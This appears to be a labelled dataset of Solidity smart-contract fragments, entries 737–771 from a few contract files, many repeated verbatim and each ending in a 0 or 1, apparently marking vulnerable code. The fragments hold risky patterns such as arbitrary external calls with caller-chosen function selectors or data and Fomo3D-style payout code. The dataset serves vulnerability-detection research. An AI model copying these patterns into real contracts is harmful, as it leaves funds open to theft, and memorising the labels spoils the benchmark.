if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
737 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
738 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
739 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
740 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
741 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
742 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
743 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
744 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
745 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
746 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
747 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
748 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
749 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
750 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
751 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
752 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
753 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
754 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
755 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
756 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
757 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
758 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
759 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
760 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
761 22902.sol
function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) {
if (isContract(_to)) {
require(allowedAddresses[_to]);
if (balanceOf(msg.sender) < _value) revert();
balances[msg.sender] = balances[msg.sender].sub(_value);
balances[_to] = balances[_to].add(_value);
assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
TransferContract(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
762 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
763 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
764 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
765 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
766 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
767 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
768 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
769 13076.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender, uint _addedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract TimedCrowdsale is Crowdsale {
using SafeMath for uint256;
uint256 public openingTime;
uint256 public closingTime;
modifier onlyWhileOpen {
require(block.timestamp >= openingTime && block.timestamp <= closingTime);
1
---------------------------------
770 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTx(_pID, _team, _eth, _keys, _eventData_);
function coreQR(address _realSender,uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_)       private   {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000) {
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000){
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
_prize = ((airDropPot_).mul(50)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 200000000000000000000000000000000;
} else if (_eth >= 100000000000000000 && _eth < 1000000000000000000) {
_prize = ((airDropPot_).mul(25)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
_eventData_.compressedData += 10000000000000000000000000000000;
_eventData_.compressedData += _prize * 1000000000000000000000000000000000;
airDropTracker_ = 0;
_eventData_.compressedData = _eventData_.compressedData + (airDropTracker_ * 1000);
plyrRnds_[_pID][_rID].keys = _keys.add(plyrRnds_[_pID][_rID].keys);
plyrRnds_[_pID][_rID].eth = _eth.add(plyrRnds_[_pID][_rID].eth);
round_[_rID].keys = _keys.add(round_[_rID].keys);
round_[_rID].eth = _eth.add(round_[_rID].eth);
rndTmEth_[_rID][_team] = _eth.add(rndTmEth_[_rID][_team]);
_eventData_ = distributeExternal(_rID, _pID, _eth, _affID, _team, _eventData_);
_eventData_ = distributeInternal(_rID, _pID, _eth, _team, _keys, _eventData_);
endTxQR(_realSender,_pID, _team, _eth, _keys, _eventData_);
0
---------------------------------
771 1123.sol
function distributeExternal(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private returns(F3Ddatasets.EventReturns)  {
uint256 _p1 = _eth / 100;
uint256 _com = _eth / 50;
_com = _com.add(_p1);
uint256 _p3d;
if (!address(admin).call.value(_com)()) {
_p3d = _com;
_com = 0;
uint256 _aff = _eth / 10;
if (_affID != _pID && plyr_[_affID].name != '') {
plyr_[_affID].aff = _aff.add(plyr_[_affID].aff);
emit F3Devents.onAffiliatePayout(_affID, plyr_[_affID].addr, plyr_[_affID].name, _rID, _pID, _aff, now);
} else {
_p3d = _aff;
_p3d = _p3d.add((_eth.mul(fees_[_team].p3d)) / (100));
if (_p3d > 0) {
admin.transfer(_p3d);
_eventData_.P3DAmount = _p3d.add(_eventData_.P3DAmount);
return(_eventData_);
function core(uint256 _rID, uint256 _pID, uint256 _eth, uint256 _affID, uint256 _team, F3Ddatasets.EventReturns memory _eventData_) private {
if (plyrRnds_[_pID][_rID].keys == 0)
_eventData_ = managePlayer(_pID, _eventData_);
if (round_[_rID].eth < 400000000000000000000 && plyrRnds_[_pID][_rID].eth.add(_eth) > 4000000000000000000){
uint256 _availableLimit = (4000000000000000000).sub(plyrRnds_[_pID][_rID].eth);
uint256 _refund = _eth.sub(_availableLimit);
plyr_[_pID].gen = plyr_[_pID].gen.add(_refund);
_eth = _availableLimit;
if (_eth > 1000000000) {
uint256 _keys = (round_[_rID].eth).keysRec(_eth);
if (_keys >= 1000000000000000000) {
updateTimer(_keys, _rID);
if (round_[_rID].plyr != _pID)
round_[_rID].plyr = _pID;
if (round_[_rID].team != _team)
round_[_rID].team = _team;
_eventData_.compressedData = _eventData_.compressedData + 100;
if (_eth >= 100000000000000000) {
airDropTracker_++;
if (airdrop() == true) {
uint256 _prize;
if (_eth >= 10000000000000000000) {
_prize = ((airDropPot_).mul(75)) / 100;
plyr_[_pID].win = (plyr_[_pID].win).add(_prize);
airDropPot_ = (airDropPot_).sub(_prize);
_eventData_.compressedData += 300000000000000000000000000000000;
} else if (_eth >= 1000000000000000000 && _eth < 10000000000000000000) {
